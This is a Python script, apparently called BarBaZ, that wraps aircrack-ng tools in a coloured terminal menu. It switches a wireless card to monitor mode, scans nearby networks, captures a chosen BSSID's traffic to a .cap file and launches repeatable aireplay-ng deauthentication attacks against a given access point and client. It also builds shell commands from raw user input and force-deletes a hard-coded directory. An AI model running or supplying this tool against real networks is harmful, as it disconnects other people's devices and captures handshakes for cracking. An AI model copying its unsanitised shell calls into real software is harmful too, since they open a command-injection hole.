#!/usr/bin/env python
#BarBaZ

import os, sys, time
from pyfiglet import Figlet

class Colors:
	
	BACK = '\u001b[30m'#Black
	OK = '\u001b[32m'#Green
	WARNING = '\u001b[31m'#Red
	RESET = '\u001b[0m'#Normal

	sudo_alert = (WARNING + '\n[Sudo Only]► ' + RESET)
	right_arrow = (OK + '►' + RESET)
	load_icon = (OK + '[' + RESET + 'Ξ' + OK + ']' + RESET)
	str_1 = (OK + '[' + RESET + '1' + OK + ']' + RESET)
	str_2 = (OK + '[' + RESET + '2' + OK + ']' + RESET)
	str_3 = (OK + '[' + RESET + '3' + OK + ']' + RESET)

def clean():
	
	os.system('clear')

def sudo_pass():
	
	while True:
		
		if os.geteuid() == 0:
			break
		
		else:
			for i in range(0, 20):
				clean()
				print(Colors.OK + '\n[:)] Please launch BarBaZ as an administrator.. [sudo su] and [./barbaz.py]' + Colors.RESET)
				time.sleep(0.1)
				clean()
				print(Colors.WARNING + '\n[:(] Please launch BarBaZ as an administrator.. [sudo su] and [./barbaz.py]' + Colors.RESET)
				time.sleep(0.1)
				clean()
			
			quit()

def loading():
	
	clean()
	
	for i in range(0, 10):
		sys.stdout.write('\rLoading Please Wait |')
		time.sleep(0.1)
		sys.stdout.write('\rLoading Please Wait /')
		time.sleep(0.1)
		sys.stdout.write('\rLoading Please Wait -')
		time.sleep(0.1)
		sys.stdout.write('\rLoading Please Wait \\')

def big_logo():

	clean()
	banner_logo = Figlet('standard')
	print(banner_logo.renderText('Bye!'))
	time.sleep(1)
	clean()

	print('''
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--```       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____''')

	time.sleep(1)
	clean()

def leave():

	loading()

	if os.geteuid() == 0:
		os.system('sudo airmon-ng stop wlan0mon')
		big_logo()
		quit()

	else:
		big_logo()
		quit()

def sep():

	print((Colors.OK + '-' + Colors.RESET) * 50)

def title():

	sep()
	banner = Figlet('banner')
	print(banner.renderText('BarBa Z'))
	sep()
	print((' ' * 12) + (Colors.OK + '--' + Colors.RESET + ' Welcome To BarBaZ ') + Colors.OK + '--' + Colors.RESET)
	sep()

def infos():

	print((' ' * 16) + (Colors.OK + '▼' + Colors.RESET + ' INFORMATIONS ' + Colors.OK + '▼' + Colors.RESET))
	print('Status: ' + Colors.OK + 'Root' + Colors.RESET)
	print('OS Detected: ' + Colors.OK + str(os.name) + Colors.RESET)
	print('Current Directory: ' + Colors.OK + str(os.getcwd()) + Colors.RESET)
	sep()

def set_5():

	clean()
	title()
	print(Colors.OK + '▼' + Colors.RESET + ' OPTIONS TARGET STATION ' + Colors.OK + '▼' + Colors.RESET)
	atk_send = input('\n[1/3] Number of sending: ')
	atk_acces_a = input('\n[2/3] Set Access Point MAC address: ')
	atk_acces_c = input('\n[3/3] Set Station MAC address to De-auth: ')
	atk_result = ('sudo aireplay-ng -0 ' + atk_send + ' -a ' + atk_acces_a + ' -c ' + atk_acces_c + ' wlan0mon')
	
	while True:

		this_while = os.system("gnome-terminal --command '" + atk_result + "'")

		repeat = input('\nRepeat the same attack? (y/n): ')

		if repeat == 'y':
			clean()
			title()
			this_while

		if repeat == 'n':
			break

def set_4():

	clean()
	title()
	print(Colors.OK + '▼' + Colors.RESET + ' OPTIONS TARGET BSSID ' + Colors.OK + '▼' + Colors.RESET)
	target_file_name = input('\n[1/3] Please name your .cap file: ')
	target_channel = input('\n[2/3] Target channel: ')
	target_bssid = input('\n[3/3] Target BSSID:  ')
	result = ('sudo airodump-ng -c ' + target_channel + ' -w Result/' + target_file_name + ' --bssid ' + target_bssid + ' wlan0mon')

	try:
		os.mkdir('Result/')

	except:
		os.system("rm -r /home/forgot666/Bureau/barbaz/Result")
		os.mkdir('Result/')

	os.system("gnome-terminal --command '" + result + "'")
	set_5()

def set_3():

	clean()
	title()
	print('\n' + Colors.load_icon + ' Starting scanning...')
	time.sleep(2)
	print('\n' + Colors.load_icon + ' Opening a new Gnome terminal...')
	time.sleep(2)
	os.system("gnome-terminal --command 'sudo airodump-ng wlan0mon'")
	set_4()

def set_2():

	clean()
	title()
	print('\n' + Colors.load_icon + ' Starting Monitor Mode...')
	time.sleep(2)
	os.system('sudo airmon-ng start wlan0')
	do_set_3 = input(Colors.sudo_alert + ' Run Monitoring Scan + De-auth Attack ? (y/n): ')
	
	if do_set_3 == 'y':
		set_3()

	if do_set_3 == 'n':
		loading()

def set_1():
	
	while True:

		sudo_pass()
		clean()
		title()
		infos()
		print('\n' + Colors.str_1 + ' Go\n\n' + Colors.str_2 + ' Quit')
		ask_1_set_1 = input('\n' + Colors.right_arrow + ' Please choose an option: ')

		if ask_1_set_1 == '1':
			print('\n' + Colors.load_icon + ' Looking for wireless network interface...\n')
			time.sleep(1)

			os.system('iwconfig')
			suite_iw_ip = input(Colors.sudo_alert + ' Switch To Monitoring (y/n): ')

			if suite_iw_ip == 'y':
				set_2()

			if suite_iw_ip == 'n':
				loading()

		if ask_1_set_1 == '2':
			sure = input('\n' + Colors.right_arrow + ' Sure ? (y/n): ')

			if sure == 'y':
				break

			if sure == 'n':
				loading()
				continue

def main():

	try:
		clean()
		title()
		infos()
		set_1()
	
	finally:
		leave()

if __name__ == '__main__':
	main()